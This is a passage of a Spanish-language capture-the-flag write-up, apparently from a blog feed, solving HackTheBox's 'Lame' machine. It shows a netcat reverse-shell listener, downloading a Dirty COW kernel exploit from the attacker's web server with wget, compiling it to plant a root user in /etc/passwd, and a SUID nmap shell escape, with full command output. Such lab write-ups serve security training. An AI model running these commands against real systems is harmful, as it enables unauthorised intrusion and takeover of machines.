+&lt;p&gt;Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deamon&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
+  listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4564 ...
+  connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.6] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.3] 54873
+  &lt;span class=&quot;nb&quot;&gt;whoami
+  &lt;/span&gt;daemon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/lame/04-intrusion2.png&quot; /&gt;       
+&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-kernel&quot;&gt;ESCALADA DE PRIVILEGIOS KERNEL&lt;/h2&gt;
+
+&lt;p&gt;Una vez tenemos acceso a la maquina vamos a realizar el escalamiento de permisos para poder obtener acceso privilegiado y control absoluto, en esta ocasión vamos a verificar la versión de kernel de la maquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+  daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+  Linux lame 2.6.24-16-server &lt;span class=&quot;c&quot;&gt;#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Realizamos la búsqueda de posibles exploits que logren dar acceso privilegiado a la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ searchsploit linux kernel 2.6.24
+  &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+   Exploit Title                                     |  Path
+  &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+  Linux Kernel &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Solaris 10 / &amp;lt; 5.10 138888-01&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Loc | solaris/local/15962.c
+  Linux Kernel 2.4.1 &amp;lt; 2.4.37 / 2.6.1 &amp;lt; 2.6.32-rc5 - | linux/local/9844.py
+  Linux Kernel 2.4.4 &amp;lt; 2.4.37.4 / 2.6.0 &amp;lt; 2.6.30.4 - | linux/local/19933.rb
+  Linux Kernel 2.6.0 &amp;lt; 2.6.31 - &lt;span class=&quot;s1&quot;&gt;'pipe.c'&lt;/span&gt; Local Privi | linux/local/33321.c
+  Linux Kernel 2.6.10 &amp;lt; 2.6.31.5 - &lt;span class=&quot;s1&quot;&gt;'pipe.c'&lt;/span&gt; Local Pr | linux/local/40812.c
+  Linux Kernel 2.6.17 &amp;lt; 2.6.24.1 - &lt;span class=&quot;s1&quot;&gt;'vmsplice'&lt;/span&gt; Local  | linux/local/5092.c
+  Linux Kernel 2.6.19 &amp;lt; 5.9 - &lt;span class=&quot;s1&quot;&gt;'Netfilter Local Privi | linux/local/50135.c
+  Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.0 | linux/remote/8556.c
+  Linux Kernel 2.6.22 &amp;lt; 3.9 (x86/x64) - '&lt;/span&gt;Dirty COW / | linux/local/40616.c
+  Linux Kernel 2.6.22 &amp;lt; 3.9 - &lt;span class=&quot;s1&quot;&gt;'Dirty COW /proc/self/ | linux/local/40847.cpp
+  Linux Kernel 2.6.22 &amp;lt; 3.9 - '&lt;/span&gt;Dirty COW PTRACE_POKE | linux/local/40838.c
+  Linux Kernel 2.6.22 &amp;lt; 3.9 - &lt;span class=&quot;s1&quot;&gt;'Dirty COW'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'PTRACE_PO | linux/local/40839.c
+  Linux Kernel 2.6.22 &amp;lt; 3.9 - '&lt;/span&gt;Dirty COW&lt;span class=&quot;s1&quot;&gt;' /proc/self | linux/local/40611.c
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hacemos la descarga del script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux/local/40839.c&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/local/40839.c
+  ❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;40839.c dirty.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por medio de un servidor http generado en python desde nuestra máquina, vamos a compartir el exploit descargado.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Desde la maquina víctima, por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; descargamos el exploit compartido anteriormente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.6/dirty.c
+  &lt;span class=&quot;nt&quot;&gt;--00&lt;/span&gt;:53:49--  http://10.10.14.6/dirty.c
+             &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;dirty.c&lt;span class=&quot;s1&quot;&gt;'
+  Connecting to 10.10.14.6:80... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 4,817 (4.7K) [text/x-csrc]
+  
+   0% [                                     ] 0             --.--100%[====================  ================&amp;gt;] 4,817         --.--K/s             
+  
+  00:53:50 (908.03 KB/s) - `dirty.c'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4817/4817]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/lame/05-exploit.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Luego de descargado, se procede a compilar el exploit.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-pthread&lt;/span&gt; dirty.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; dirty &lt;span class=&quot;nt&quot;&gt;-lcrypt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente, ejecutamos el exploit seguido de una contraseña aleatoria, en este caso la mía ha sido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hacked&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./dirty hacked 
+  /etc/passwd successfully backed up to /tmp/passwd.bak
+  Please enter the new password: hacked
+  Complete line:
+  bast1ant1c:fiOEyJZz3b5lA:0:0:pwned:/root:/bin/bash
+  
+  mmap: b7ef5000
+  ptrace 0
+  Done! Check /etc/passwd to see &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the new user was created.
+  You can log &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;with the username &lt;span class=&quot;s1&quot;&gt;'bast1ant1c'&lt;/span&gt; and the password &lt;span class=&quot;s1&quot;&gt;'hacked'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+  
+  
+  DON&lt;span class=&quot;s1&quot;&gt;'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+  daemon@lame:/tmp$ madvise 0
+  
+  Done! Check /etc/passwd to see if the new user was created.
+  You can log in with the username '&lt;/span&gt;bast1ant1c&lt;span class=&quot;s1&quot;&gt;' and the password '&lt;/span&gt;hacked&lt;span class=&quot;s1&quot;&gt;'.
+  
+  
+  DON'&lt;/span&gt;T FORGET TO RESTORE! &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /tmp/passwd.bak /etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;NOTA:&lt;/em&gt; El script fue modificado para traer como username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bast1ant1c&lt;/code&gt;, el usuario por defecto es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firefart&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora que tenemos usuario y contraseña, vamos a conectarnos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; a la maquina víctima.&lt;/p&gt;
+
+&lt;p&gt;El exploit ha creado un usuario con permisos de administración, por lo que la conexión realizada nos da acceso a un usuario con todos los privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ❯ ssh bast1ant1c@10.10.10.3                                                             
+  bast1ant1c@10.10.10.3&lt;span class=&quot;s1&quot;&gt;'s password:                                                       
+  Last login: Mon Jul 11 23:25:01 2022 from :0.0                                          
+  Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686                    
+                                                                                          
+  The programs included with the Ubuntu system are free software;                         
+  the exact distribution terms for each program are described in the                      
+  individual files in /usr/share/doc/*/copyright.                                         
+                                                                                          
+  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by                    
+  applicable law.                                                                         
+                                                                                          
+  To access official Ubuntu documentation, please visit:                                  
+  http://help.ubuntu.com/                                                                 
+  bast1ant1c@lame:~# whoami                                                               
+  bast1ant1c
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;NOTA:&lt;/em&gt; Sigue la recomendación del exploit “DON’T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd” para restablecer los usuarios de la máquina.&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-por-permisos&quot;&gt;ESCALADA DE PRIVILEGIOS POR PERMISOS&lt;/h2&gt;
+
+&lt;p&gt;Ahora vamos a realizar el escalamiento de privilegios revisando los permisos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; /4000 2&amp;gt;/dev/null                                        
+  /bin/umount
+  /bin/fusermount
+  /bin/su
+  /bin/mount
+  /bin/ping
+  /bin/ping6
+  /sbin/mount.nfs
+  /lib/dhcp3-client/call-dhclient-script
+  /usr/bin/sudoedit
+  /usr/bin/X
+  /usr/bin/netkit-rsh
+  /usr/bin/gpasswd
+  /usr/bin/traceroute6.iputils
+  /usr/bin/sudo
+  /usr/bin/netkit-rlogin
+  /usr/bin/arping
+  /usr/bin/at
+  /usr/bin/newgrp
+  /usr/bin/chfn
+  /usr/bin/nmap
+  /usr/bin/chsh
+  /usr/bin/netkit-rcp
+  /usr/bin/passwd
+  /usr/bin/mtr
+  /usr/sbin/uuidd
+  /usr/sbin/pppd
+  /usr/lib/telnetlogin
+  /usr/lib/apache2/suexec
+  /usr/lib/eject/dmcrypt-get-device
+  /usr/lib/openssh/ssh-keysign
+  /usr/lib/pt_chown
+  /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+  /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos ver que tenemos permiso de ejecución en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/nmap&lt;/code&gt;, así que buscamos en &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#shell&quot;&gt;GTFObins&lt;/a&gt; como obtener una shell por este medio.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  daemon@lame:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
+  nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
+  
+  Starting Nmap V. 4.53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://insecure.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; press h &amp;lt;enter&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;help
+  &lt;/span&gt;nmap&amp;gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
+  &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;sh
+  sh-3.2# &lt;span class=&quot;nb&quot;&gt;whoami
+  whoami
+  &lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Logramos tener acceso como root! No queda nada más, vamos a acceder a las carpetas que contienen las flags y eso es todo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  sh-3.2# find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt | xargs &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+  &lt;/span&gt;bf63bb140c
+  
+  find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt | xargs &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+  &lt;/span&gt;9179df2fa8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lame&lt;/code&gt; de HackTheBox!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/lame/06-finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Lame" /><summary type="html">Vamos a resolver la maquina Lame de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">osping</title><link href="http://localhost:4000/osping/" rel="alternate" type="text/html" title="osping" /><published>2022-07-20T00:00:00-05:00</published><updated>2022-07-20T00:00:00-05:00</updated><id>http://localhost:4000/osping</id><content type="html" xml:base="http://localhost:4000/osping/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/mkhack/prueba.png&quot; /&gt;
 &lt;/p&gt;
 
